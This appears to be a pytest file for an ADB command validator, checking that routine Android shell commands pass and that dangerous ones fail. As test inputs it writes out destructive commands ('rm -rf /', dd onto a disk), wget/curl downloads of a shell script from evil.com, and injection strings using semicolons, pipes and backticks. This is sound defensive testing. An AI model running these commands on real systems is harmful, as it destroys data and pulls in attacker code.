...
class TestValidateAdbCommand:
    ...
    def test_empty_command_rejected(self):
        ok, _reason = _validate_adb_command("")
        assert not ok
    ...
    def test_input_text_allowed(self):
        ok, _reason = _validate_adb_command("input text hello")
        assert ok

    def test_input_keyevent_allowed(self):
        ok, _reason = _validate_adb_command("input keyevent 26")
        assert ok
    ...
    def test_pm_install_allowed(self):
        ok, _reason = _validate_adb_command("pm install /data/app/foo.apk")
        assert ok
    ...
    def test_screenrecord_allowed(self):
        ok, _reason = _validate_adb_command("screenrecord /sdcard/demo.mp4")
        assert ok

    def test_getprop_allowed(self):
        ok, _reason = _validate_adb_command("getprop ro.build.version.sdk")
        assert ok

    def test_dumpsys_allowed(self):
        ok, _reason = _validate_adb_command("dumpsys activity")
        assert ok

    def test_settings_get_allowed(self):
        ok, _reason = _validate_adb_command("settings get secure user_setup_complete")
        assert ok

    def test_monkey_allowed(self):
        ok, _reason = _validate_adb_command("monkey -p com.example -c android.intent.category.LAUNCHER 1")
        assert ok
    ...
    def test_su_reboot_blocked(self):
        ok, _reason = _validate_adb_command("su root reboot")
        assert not ok

    def test_dd_blocked(self):
        ok, _reason = _validate_adb_command("dd if=/dev/zero of=/dev/sda")
        assert not ok

    def test_rm_rf_blocked(self):
        ok, _reason = _validate_adb_command("rm -rf /")
        assert not ok

    def test_wget_blocked(self):
        ok, _reason = _validate_adb_command("wget http://evil.com/shell.sh")
        assert not ok

    def test_curl_blocked(self):
        ok, _reason = _validate_adb_command("curl http://evil.com/shell.sh")
        assert not ok

    def test_android_shell_blocked(self):
        ok, _reason = _validate_adb_command("sh")
        assert not ok

    # --- Blocked dangerous characters ---

    def test_pipe_character_blocked(self):
        ok, _reason = _validate_adb_command("cat /etc/passwd | ls")
        assert not ok

    def test_semicolon_blocked(self):
        ok, _reason = _validate_adb_command("ls; rm -rf /")
        assert not ok
    ...
    def test_backtick_blocked(self):
        ok, _reason = _validate_adb_command("echo `whoami`")
        assert not ok
    ...
    def test_output_redirect_blocked(self):
        ok, _reason = _validate_adb_command("echo hello > /data/local/tmp/out.txt")
        assert not ok
    ...
    def test_uppercase_command_blocked(self):
        ok, _reason = _validate_adb_command("REBOOT")
        assert not ok
